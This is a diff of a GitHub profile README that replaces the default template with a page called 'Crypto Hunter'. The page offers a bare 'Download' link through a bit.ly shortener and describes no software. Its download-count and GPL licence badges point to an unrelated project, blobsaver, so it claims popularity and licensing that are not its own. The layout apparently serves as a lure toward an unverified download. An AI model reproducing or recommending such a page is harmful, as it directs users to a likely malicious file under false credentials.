@@ -1,16 +1,15 @@
-### Hi there 👋
+# Crypto Hunter  ![GitHub All Releases](https://img.shields.io/github/downloads/airsquared/blobsaver/total.svg)
+  
+  ![cePTVK1O1fUxH0d0ahMQ1HRgvGcoG27iRwr6flfTH9mDqbqT6HQWTOwwM8h578VC_5N4FZsGsSv-KetI6Rrfb-fr](https://github.com/cartbear3/cartbear3/assets/167147080/cb0058f4-7df0-4c75-9cd5-0c75e586fd56)
 
-<!--
-**cartbear3/cartbear3** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+  
+  # ⏬ Download ⏬
+---  
+* [Download](https://bit.ly/49B390L)
+---
 
-Here are some ideas to get you started:
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+## License [![GitHub license](https://img.shields.io/github/license/airsquared/blobsaver.svg)](https://github.com/airsquared/blobsaver/blob/master/LICENSE)
+This project is licensed under GNU GPL v3.0-only - see the [LICENSE](https://github.com/airsquared/blobsaver/blob/master/LICENSE) file for details
+
+
